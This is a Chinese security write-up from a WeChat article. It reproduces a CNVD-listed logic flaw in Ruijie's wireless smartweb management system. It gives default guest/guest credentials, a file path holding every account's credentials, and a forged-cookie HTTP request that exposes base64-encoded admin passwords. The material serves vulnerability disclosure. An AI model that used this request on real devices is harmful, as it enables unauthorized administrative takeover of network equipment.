> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：PeiQi  
本文字数：700

阅读时长：10min

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

一、

**_漏洞描述_**

锐捷网络股份有限公司无线 smartweb 管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。

二、

**_漏洞影响_**

锐捷网络股份有限公司 无线 smartweb 管理系统  

三、

**_漏洞复现_**

今天逛 CNVD 看到了这个漏洞的公开

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z57oe2MLpAedeHZGWe7ibQelWcZ2V0Y6ibUntbMicDdU6g6REXJBJbN1WKA/640?wx_fmt=png)

于是网上找设备登录页面的截图，发现标题为   **无线 smartWeb-- 登录页面**

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5tTgfZCzXHO1m4GIlo882ngkElD8Lia5iaNLecicpjWNAbjBSWDjPFL9ibg/640?wx_fmt=png)

登录页面如下

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5gBVId3xEWldIibh6O2pQ0nJk3PJYO4xL4bAC97Gk1MfIia3V0Eiamhd6Q/640?wx_fmt=png)

然后找到了一个设备存在管理 admin 员的弱口令，进去后发现 Web CLI 控制台

翻文件的过程中发现一个文件很有意思，运行命令查看

```
more /web/xml/webuser-auth.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5OnyuqAqOfBqW60AMNlBOWcNmPibWgS1Z5vwoHWmJQABia29qbz8ZtMug/640?wx_fmt=png)

里面存在所有人的账号密码，于是测试直接访问  

```
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml
发现被拦截了，不能访问，想到刚刚CNVD的描述是低权限获取高权限账号
```

于是继续爆破账号密码，找一个低权限账号，然后正在愁密码的时候，看见另一条 CNVD

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5rc7VHvNLVog6n9rs5aqKOrHsxAEzicwQUoJoJZ5IibOoDbyVVu2KVPsw/640?wx_fmt=png)  

拿几个弱口令爆破一下，发下多个设备默认存在 guest 账户，账号密码为 **guest/guest**

**![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5HOLQRSDyhZThhnKsItdWap9a8Ds3JK2KKXSErhjfPxOTqptQZVAOZg/640?wx_fmt=png)**

但是没有 CIL 控制台可以使用了，在重新测试访问刚刚的漏洞点  

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5MCJG0YcmAa8VIiajjUh2e5HS4t7Amg8v6ulIBPZibvU1Xpz8bibpjc8hQ/640?wx_fmt=png)

解密就可以获得 admin 管理员的密码，请求为

```
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml

Cookie添加
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
```

直接获得所有的账户的等级标志和 base64 加密的账号密码, 解密后即可登录后台

  

四、

**_Goby & POC_**

```
Goby & POC 已经同步到 Github仓库中的 Goby & POC 目录
https://github.com/PeiQi0/PeiQi-WIKI-POC
https://github.com/wgpsec/wiki
其中包含CNVD-2020-56167 和 CNVD-2021-17369
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5Lbg57vTqdtxtj5vHppUJT68icKxUqVPmBOIjE7npO9BSaCynkwqnxeA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCffCVIoqDakaLe9OZ5Q6Z5acpu6AZhQ1SnFYJjiatvfUFesm50p3D63o3dUcGZK290IyxXWCruDDg/640?wx_fmt=png)

  

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDCc55WbFiasXQV2ZDzFo8NclAZ2LicCiaeLqxOD3AticSzDm7rRACia7M9m4pickkG8pXR2w1L8maEoBSw/640?wx_fmt=png)

推荐一下 PeiQi 的个人公众号~

公众号

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)